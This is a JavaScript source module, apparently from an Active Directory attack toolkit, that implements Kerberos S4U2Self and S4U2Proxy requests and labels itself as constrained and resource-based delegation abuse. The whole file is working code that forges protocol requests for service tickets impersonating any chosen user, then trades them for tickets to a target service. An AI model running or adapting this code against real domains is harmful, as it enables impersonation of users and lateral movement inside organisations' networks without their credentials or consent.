// S4U2Self + S4U2Proxy (MS-SFU) — constrained/resource-based delegation abuse.
// Extends the KerberosClient's TGS exchange with the S4U PA-DATA types.

import { concat, sequence } from '../ldap/ber.js';
import {
  ctx, asnInt, generalString, principalName,
  encryptedData, paData, authenticator, apReq, checksumValue,
  kdcReq, kdcReqBody,
  parseKdcRep, parseEncKdcRepPart, parseKrbError,
} from './asn1.js';
import { encrypt, decrypt } from './crypto.js';
import {
  MSG_TYPE, NAME_TYPE, PADATA, KEY_USAGE, KDC_OPTIONS, ETYPE_PREFERENCE,
} from './constants.js';
import { hmacMd5 } from '../crypto/md5.js';

const enc = new TextEncoder();

const TAG_TGS_REP = 0x6d;
const TAG_KRB_ERROR = 0x7e;
const FAR_FUTURE = new Date(Date.UTC(2037, 8, 13, 2, 48, 5));

function randomNonce() {
  const b = new Uint8Array(4);
  (globalThis.crypto || {}).getRandomValues?.(b);
  return ((b[0] << 24 | b[1] << 16 | b[2] << 8 | b[3]) >>> 0) & 0x7fffffff;
}

function paForUser(username, realm, sessionKey) {
  const ntBuf = new Uint8Array(4);
  new DataView(ntBuf.buffer).setInt32(0, NAME_TYPE.PRINCIPAL, true);
  const data = concat([ntBuf, enc.encode(username), enc.encode(realm), enc.encode('Kerberos')]);
  const cksum = hmacMd5(sessionKey.key, data);
  const value = sequence(
    ctx(0, principalName(NAME_TYPE.PRINCIPAL, [username])),
    ctx(1, generalString(realm)),
    ctx(2, checksumValue(-138, cksum)),
    ctx(3, generalString('Kerberos')),
  );
  return paData(PADATA.FOR_USER, value);
}

// S4U2Self: request a service ticket on behalf of `impersonateUser`.
// The calling service uses its own TGT; the KDC issues a ticket for
// impersonateUser → service, without needing the user's credentials.
export async function s4u2self(transport, tgt, { servicePrincipal, impersonateUser, impersonateRealm = null, log = () => {} }) {
  const realm = tgt.realm.toUpperCase();
  const targetRealm = (impersonateRealm || realm).toUpperCase();
  const sname = servicePrincipal.split('/');
  const nonce = randomNonce();
  const sk = tgt.sessionKey;

  const auth = authenticator({
    crealm: tgt.crealm, cname: tgt.cname,
    ctime: new Date(Date.now() + (tgt.clockOffsetMs || 0)), cusec: 0,
  });
  const encAuth = encryptedData(sk.etype, encrypt(sk.etype, sk.key, KEY_USAGE.TGS_REQ_AUTH, auth));
  const ap = apReq({ apOptions: 0, ticket: tgt.ticket, encAuthenticator: encAuth });
  const paTgs = paData(PADATA.TGS_REQ, ap);
  const paUser = paForUser(impersonateUser, targetRealm, sk);

  const body = kdcReqBody({
    kdcOptions: KDC_OPTIONS.FORWARDABLE | KDC_OPTIONS.RENEWABLE,
    realm, sname, snameType: NAME_TYPE.SRV_INST,
    till: FAR_FUTURE, nonce, etypes: ETYPE_PREFERENCE,
  });

  log(`S4U2Self: requesting ticket for ${impersonateUser}@${targetRealm} → ${servicePrincipal}`);
  const reply = await transport.request(kdcReq(MSG_TYPE.TGS_REQ, body, [paTgs, paUser]));

  if (reply[0] === TAG_KRB_ERROR) {
    const err = parseKrbError(reply);
    throw new Error(`S4U2Self failed: error ${err.errorCode}`);
  }
  if (reply[0] !== TAG_TGS_REP) throw new Error(`unexpected S4U2Self reply tag 0x${reply[0].toString(16)}`);

  const rep = parseKdcRep(reply);
  const encPart = decrypt(sk.etype, sk.key, KEY_USAGE.TGS_REP_ENCPART_SESSKEY, rep.encPart.cipher);
  const dec = parseEncKdcRepPart(encPart);
  log(`S4U2Self: got ticket for ${impersonateUser} → ${servicePrincipal} (etype ${dec.key.etype})`);

  return {
    ticket: rep.ticket,
    sessionKey: { etype: dec.key.etype, key: dec.key.keyvalue },
    crealm: tgt.crealm,
    cname: [impersonateUser],
    realm,
    spn: servicePrincipal,
    clockOffsetMs: tgt.clockOffsetMs || 0,
  };
}

// S4U2Proxy: exchange the S4U2Self ticket for a ticket to a target service,
// impersonating the same user. Requires the service to have constrained or
// resource-based constrained delegation configured.
export async function s4u2proxy(transport, tgt, s4uTicket, { targetSpn, log = () => {} }) {
  const realm = tgt.realm.toUpperCase();
  const sname = targetSpn.split('/');
  const nonce = randomNonce();
  const sk = tgt.sessionKey;

  const auth = authenticator({
    crealm: tgt.crealm, cname: tgt.cname,
    ctime: new Date(Date.now() + (tgt.clockOffsetMs || 0)), cusec: 0,
  });
  const encAuth = encryptedData(sk.etype, encrypt(sk.etype, sk.key, KEY_USAGE.TGS_REQ_AUTH, auth));
  const ap = apReq({ apOptions: 0, ticket: tgt.ticket, encAuthenticator: encAuth });
  const paTgs = paData(PADATA.TGS_REQ, ap);

  const body = kdcReqBody({
    kdcOptions: KDC_OPTIONS.FORWARDABLE | KDC_OPTIONS.RENEWABLE | 0x00004000, // CNAME-IN-ADDL-TKT
    realm, sname, snameType: NAME_TYPE.SRV_INST,
    till: FAR_FUTURE, nonce, etypes: ETYPE_PREFERENCE,
    additionalTickets: [s4uTicket.ticket],
  });

  log(`S4U2Proxy: requesting ticket for ${s4uTicket.cname[0]} → ${targetSpn}`);
  const reply = await transport.request(kdcReq(MSG_TYPE.TGS_REQ, body, [paTgs]));

  if (reply[0] === TAG_KRB_ERROR) {
    const err = parseKrbError(reply);
    throw new Error(`S4U2Proxy failed: error ${err.errorCode}`);
  }
  if (reply[0] !== TAG_TGS_REP) throw new Error(`unexpected S4U2Proxy reply tag 0x${reply[0].toString(16)}`);

  const rep = parseKdcRep(reply);
  const encPart = decrypt(sk.etype, sk.key, KEY_USAGE.TGS_REP_ENCPART_SESSKEY, rep.encPart.cipher);
  const dec = parseEncKdcRepPart(encPart);
  log(`S4U2Proxy: got ticket for ${s4uTicket.cname[0]} → ${targetSpn} (etype ${dec.key.etype})`);

  return {
    ticket: rep.ticket,
    sessionKey: { etype: dec.key.etype, key: dec.key.keyvalue },
    crealm: tgt.crealm,
    cname: s4uTicket.cname,
    realm,
    spn: targetSpn,
    clockOffsetMs: tgt.clockOffsetMs || 0,
  };
}
